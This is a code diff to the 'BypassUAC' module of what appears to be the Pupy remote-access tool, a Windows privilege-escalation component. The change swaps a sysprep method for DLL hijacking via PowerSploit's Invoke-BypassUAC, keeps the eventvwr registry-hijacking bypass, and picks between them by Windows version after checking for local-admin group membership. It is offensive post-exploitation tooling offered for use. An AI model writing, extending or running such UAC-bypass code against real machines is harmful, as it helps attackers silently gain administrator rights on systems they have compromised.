@@ -12,22 +12,38 @@ ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))
 
 @config(compat="windows", category="privesc")
 class BypassUAC(PupyModule):
-    """try to bypass UAC with sysprep or eventvwr method"""
-    dependencies=["psutil", "pupwinutils.processes"]
-    METHODS = ["eventvwr", "sysprep"]
+    """try to bypass UAC """
+    dependencies=["psutil", "pupwinutils.processes", "pupwinutils.security"]
+    
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog="bypassuac", description=self.__doc__)
-        self.arg_parser.add_argument('-m', dest='method', choices=self.METHODS, default=None, help="Use a specific method. 'sysprep' can be used for wind7-8.1 (no wind10) and 'eventvwr' for wind7-10. By default, 'sysprep' for wind7-8.1 targets and 'eventvwr' for wind10. ")
+        self.arg_parser.add_argument('-m', dest='method', choices=["eventvwr", "dll_hijacking"], default=None, help="Default: the technic will be choosen for you. 'dll_hijacking' for wind7-8.1 and 'eventvwr' for wind7-10.")
 
     def run(self, args):
-		if self.client.desc['proc_arch'] == '32bit' and self.client.conn.modules['pupwinutils.processes'].is_x64_architecture():
-			self.error("You are using a x86 process while the os architecture is x64")
-			self.error("Migrate to a x64 process before trying to bypass UAC")
-		elif args.method == "eventvwr" or (self.client.desc['release'] == '10' and args.method == None):
-			self.success("Trying to bypass UAC with Eventvwr method (UAC Bypass using eventvwr.exe and Registry Hijacking), wind7-10 targets...")
-			bypassUasModule = bypassuac(self, rootPupyPath=ROOT)
-			bypassUasModule.bypassuac_through_EventVwrBypass()
+		# check if a UAC Bypass can be done
+		if not self.client.conn.modules["pupwinutils.security"].can_get_admin_access():
+			self.error('Your are not on the local administrator group.')
+			return
+
+		dll_hijacking = False
+		registry_hijacking = False
+
+		bypassUasModule = bypassuac(self, rootPupyPath=ROOT)
+		# choose methods depending on the OS Version
+		if not args.method:
+			if self.client.desc['release'] == '10':
+				registry_hijacking = True
+			else:
+				dll_hijacking = True
+		elif args.method == "eventvwr":		
+			registry_hijacking = True
 		else:
-			self.success("Trying to bypass UAC with sysprep method (bypass UAC using the trusted publisher certificate through process injection), wind7-8.1 targets...")
-			bypassUasModule = bypassuac(self, rootPupyPath=ROOT)
+			dll_hijacking = True
+
+		if registry_hijacking:
+			self.success("Trying to bypass UAC using the Eventvwr method, wind7-10 targets...")
+			bypassUasModule.bypassuac_through_EventVwrBypass()
+		elif dll_hijacking:
+			# Invoke-BypassUAC.ps1 uses different technics to bypass depending on the Windows Version (Sysprep for Windows 7/2008 and NTWDBLIB.dll for Windows 8/2012)
+			self.success("Trying to bypass UAC using DLL Hijacking, wind7-8.1 targets...")
 			bypassUasModule.bypassuac_through_PowerSploitBypassUAC()
